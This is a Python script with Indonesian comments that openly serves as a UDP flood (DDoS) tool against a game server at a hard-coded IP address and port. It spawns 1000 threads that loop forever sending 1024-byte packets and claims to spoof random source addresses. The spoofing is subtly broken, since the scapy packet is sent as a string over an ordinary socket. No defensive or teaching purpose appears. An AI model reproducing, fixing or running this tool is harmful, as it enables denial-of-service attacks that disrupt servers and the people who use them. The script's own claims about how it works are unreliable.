import socket
import threading
from scapy.all import IP, UDP, Raw
import random
import time

# Konfigurasi Target
TARGET_IP = "208.84.103.75"  # Ganti dengan IP server target
TARGET_PORT = 7104               # Port default GTA:SA-MP
THREADS = 1000                   # Jumlah thread (semakin tinggi, semakin berat serangan)
PACKET_SIZE = 1024               # Ukuran paket (dalam byte)

def ddos_attack():
    while True:
        try:
            # Membuat paket UDP acak dengan spoofing IP
            spoofed_ip = ".".join(map(str, (random.randint(0,255) for _ in range(4))))
            packet = IP(src=spoofed_ip, dst=TARGET_IP) / UDP(dport=TARGET_PORT) / Raw(load="A"*PACKET_SIZE)
            
            # Mengirim paket menggunakan socket raw (memerlukan privilese root)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(str(packet).encode(), (TARGET_IP, TARGET_PORT))
            sock.close()
            
            print(f"[+] Menyerang {TARGET_IP}:{TARGET_PORT} dari {spoofed_ip}")
        except Exception as e:
            print(f"[!] Error: {e}")
            continue

# Memulai serangan dengan multi-threading
for _ in range(THREADS):
    thread = threading.Thread(target=ddos_attack)
    thread.start()
    time.sleep(0.1)  # Agar tidak terlalu cepat menghabiskan sumber daya lokal